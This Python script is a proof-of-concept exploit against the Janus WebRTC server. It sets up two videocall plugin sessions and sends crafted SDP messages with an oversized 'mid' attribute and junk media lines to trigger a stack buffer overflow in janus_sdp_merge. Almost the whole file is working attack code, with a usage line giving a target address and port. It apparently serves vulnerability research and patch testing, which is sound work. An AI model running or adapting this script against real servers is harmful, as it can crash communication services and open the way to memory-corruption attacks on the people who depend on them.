#!/usr/bin/env python3

# Trigger Stack Buffer Overflow vulnerability in Janus.
# Vulnerable: janus_sdp_merge
# python3 ./sdp_merge_stack_bof.py -s http://10.10.10.10 -p 8088


import sys

from utils import JanusPlugin, JanusSession, Exploit

from aiortc import RTCPeerConnection, RTCSessionDescription, VideoStreamTrack


class ExploitSDPMergeBOF(Exploit):
    def __init__(self, server, port):
        self.url = '{}:{}/janus'.format(server, port)
        self.plugin_name = 'janus.plugin.videocall'

        self.payload = 'A' * 512

    async def create_user_and_call(self,
                                   myname,
                                   targetname):        
        session = JanusSession(self.url, myname)
        await session.create()
        self.log_success('[user] : session created')
        
        plugin = await session.attach(self.plugin_name)
        self.log_success('[user] : attached to {} plugin'.format(self.plugin_name))
        
        response = await plugin.send({
            "body": {
                "request": "register", 
                "username": myname
            }
        })
        self.log_success('[user] : registered')
        
        response = await plugin.send({
            "body": {
                "request": "list"
            }
        })

        pc = RTCPeerConnection()
        pc.addTrack(VideoStreamTrack())

        await pc.setLocalDescription(await pc.createOffer())
        sdp = "\n".join([
            "v=0",
            "o=mozilla...THIS_IS_SDPARTA-74.0 2447000379536746271 0 IN IP4 0.0.0.0",
            "s=-",
            "t=0 0",
            "a=fingerprint:sha-256 9A:9C:0E:72:47:18:43:2D:A6:61:17:94:53:73:E0:6A:D5:99:F3:8C:D5:F4:DE:0C:BA:94:61:98:4C:FC:AD:02",
            "m=video 9 UDP/TLS/RTP/SAVPF 120 121 126 97",
            "c=IN IP4 0.0.0.0",
            "a=sendrecv",
            "a=ice-pwd:0b5a4e0345d7490bf75350794acb07d6",
            "a=ice-ufrag:79a8384b",
            "a=mid:1234",
            "a=rtpmap:120 VP8/90000",
            "a=rtpmap:121 VP9/90000",
            "a=rtpmap:126 H264/90000",
            "a=rtpmap:97 H264/90000",
            
            "m=application 9 UDP/DTLS/SCTP webrtc-datachannel",
            "a=mid:{}\n".format(self.payload),
        ])

        self.log_info('[user] : malicious sdp is ready')

        self.log_info('[user] : sending call request...')
        response = await plugin.send({
            "body": {
                "request": "call",
                "username": targetname
            },
            "jsep": {
                "sdp": sdp,
                "type": pc.localDescription.type
            }
        })
        answer = await session.get_answer()
        # self.log_info("[user] : got answer: {}".format(answer))

        await pc.setRemoteDescription(
            RTCSessionDescription(
                sdp=answer["sdp"],
                type=answer["type"]
            )
        )
        await asyncio.sleep(10)

    async def create_target_user_and_accept(self, targetname):
        session = JanusSession(self.url, targetname)
        await session.create()
        self.log_success('[targetuser] : session created')
        
        plugin = await session.attach(self.plugin_name)
        self.log_success('[targetuser] : attached to {} plugin'.format(self.plugin_name))

        response = await plugin.send({
            "body": {
                "request": "register", 
                "username": targetname
            }
        })
        self.log_success('[targetuser] : registered')

        pc = RTCPeerConnection()
        pc.addTrack(VideoStreamTrack())

        offer = await session.get_offer()
        # self.log_info("[targetuser] : got offer: {}".format(offer))

        await pc.setRemoteDescription(
            RTCSessionDescription(
                sdp=offer["sdp"],
                type=offer["type"]
            )
        )
        self.log_info('[targetuser] : remote description is ready')
        
        await pc.setLocalDescription(await pc.createAnswer())
        self.log_info('[targetuser]: answer created')
        
        sdp = '\n'.join([
            "v=0",
            "o=mozilla...THIS_IS_SDPARTA-74.0 2447000379536746271 0 IN IP4 0.0.0.0",
            "s=-",
            "t=0 0",
            "a=fingerprint:sha-256 9A:9C:0E:72:47:18:43:2D:A6:61:17:94:53:73:E0:6A:D5:99:F3:8C:D5:F4:DE:0C:BA:94:61:98:4C:FC:AD:02",
            "m=video 9 UDP/TLS/RTP/SAVPF 120 121 126 97",
            "c=IN IP4 0.0.0.0",
            "a=sendrecv",
            "a=ice-pwd:0b5a4e0345d7490bf75350794acb07d6",
            "a=ice-ufrag:79a8384b",
            "a=mid:1234",
            "a=rtpmap:120 VP8/90000",
            "a=rtpmap:121 VP9/90000",
            "a=rtpmap:126 H264/90000",
            "a=rtpmap:97 H264/90000",

            "m=application 9 UDP/DTLS/SCTP webrtc-datachannel",
            "a=mid:{}".format(self.payload),

            "m=application 9 JUNKJUNK webrtc-datachann",
            "a=mid:4567",
            "m=application 9 JUNKJUNK webrtc-datachann",
            "a=mid:4567",
            "m=application 9 JUNKJUNK webrtc-datachann",
            "a=mid:4567",
            "m=application 9 JUNKJUNK webrtc-datachann",
            "a=mid:4567\n",
        ])

        try:
            self.log_info('[targetuser] : sending answer back...')
            response = await plugin.send({
                "body":{
                    "request": "accept"
                },
                "jsep": {
                    "sdp": sdp,
                    "type": pc.localDescription.type
                }
            })
            await asyncio.sleep(10)
        except Exception:
            self.log_success('[targetuser] : bof is triggered')

    def exploit(self,
                myname='konata1',
                targetname='konata2'):
        super().exploit(tasks=[
            (self.create_target_user_and_accept,    (targetname,)),
            (self.create_user_and_call,             (myname, targetname))
        ])


if __name__ == '__main__':
    server, port = Exploit.parse_args()
    if server is None or port is None:
        log.error('invalid arguments')

    exp = ExploitSDPMergeBOF(server, port)
    exp.exploit()
